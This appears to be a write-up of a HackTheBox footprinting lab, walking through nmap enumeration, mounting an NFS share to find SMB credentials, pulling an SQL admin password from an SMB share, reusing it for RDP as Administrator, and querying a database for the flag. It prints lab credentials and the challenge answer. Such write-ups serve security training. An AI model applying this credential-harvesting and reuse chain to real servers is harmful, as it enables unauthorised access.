# Medium
This second server is a server that everyone on the internal network has access to. In our discussion with our client, we pointed out that these servers are often one of the main targets for attackers and that this server should be added to the scope.

Our customer agreed to this and added this server to our scope. Here, too, the goal remains the same. We need to find out as much information as possible about this server and find ways to use it against the server itself. For the proof and protection of customer data, a user named HTB has been created. Accordingly, we need to obtain the credentials of this user as proof.

> Task: Enumerate the server carefully and find the username "HTB" and its password. Then, submit this user's password as the answer. **Answer: lnch7ehrdn43i7AoqVPK4zWR**

1. Enumerate the target first using nmap:
```
$ sudo nmap -Pn --disable-arp-ping -n <ip>
PORT     STATE SERVICE
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
```
2. First enumerate the NFS service:
- Show available shares: `$ showmount -e <ip>` -> found /Techsupport
- Mount the share and list files:
```
$ mkdir mnt/techsupport
$ sudo mount -t nfs <ip>:/Techsupport mnt/techsupport -o nolock
$ sudo ls -lah mnt/techsupport
```
-> Found this file with size > 0: `ticket4238791283782.txt`
- Cat the file and retrieve this content:
```
 1smtp {
 2    host=smtp.web.dev.inlanefreight.htb
 3    #port=25
 4    ssl=true
 5    user="alex"
 6    password="lol123!mD"
 7    from="alex.g@web.dev.inlanefreight.htb"
 8}
 9
10securesocial {
11
12    onLoginGoTo=/
13    onLogoutGoTo=/login
14    ssl=false
15
16    userpass {
17      withUserNameSupport=false
18      sendWelcomeEmail=true
19      enableGravatarSupport=true
20      signupSkipLogin=true
21      tokenDuration=60
22      tokenDeleteInterval=5
23      minimumPasswordLength=8
24      enableTokenJob=true
25      hasher=bcrypt
26      }
27
28     cookie {
29     #       name=id
30     #       path=/login
31     #       domain="10.129.2.59:9500"
32            httpOnly=true
33            makeTransient=false
34            absoluteTimeoutInMinutes=1440
35            idleTimeoutInMinutes=1440
36    }
```
3. With the found credentials `alex:lol123!mD`, get access to the SMB server:
- `# smbclient -L //<ip> -U "alex%lol123!mD"` -> found the `devshare` share
- Enumerate this share:
```
# smbclient -L //<ip>/devshare -U "alex%lol123!mD"
smb: \> ls
  .                                   D        0  Wed Nov 10 23:12:22 2021
  ..                                  D        0  Wed Nov 10 23:12:22 2021
  important.txt                       A       16  Wed Nov 10 23:12:55 2021

                6367231 blocks of size 4096. 2592865 blocks available
smb: \> get important.txt
getting file \important.txt of size 16 as important.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```
- Read the file at host and found the credential for the SQL Server admin: 
```
$ cat important.txt
sa:87N1ns@slls83
```
4. Since RDP is enabled (base on the nmap result), try to connect to the target. Base on the hint: `We also need to keep in mind, that each Windows system has an Administrator account.`, use this credential to log in as the admin: `Administrator:87N1ns@slls83`
- `$ xfreerdp3 /u:Administrator /p:87N1ns@slls83 /v:<ip>`
- Once logged in, open the Microsoft SQL Server Management Studio, find the table `dbo.devsacc` inside the `accounts` database and query for the user's password:
    ```
    USE [accounts]
    GO

    SELECT [id]
        ,[name]
        ,[password]
    FROM [dbo].[devsacc]
    WHERE name='HTB'

    GO
    ```

`Answer: lnch7ehrdn43i7AoqVPK4zWR`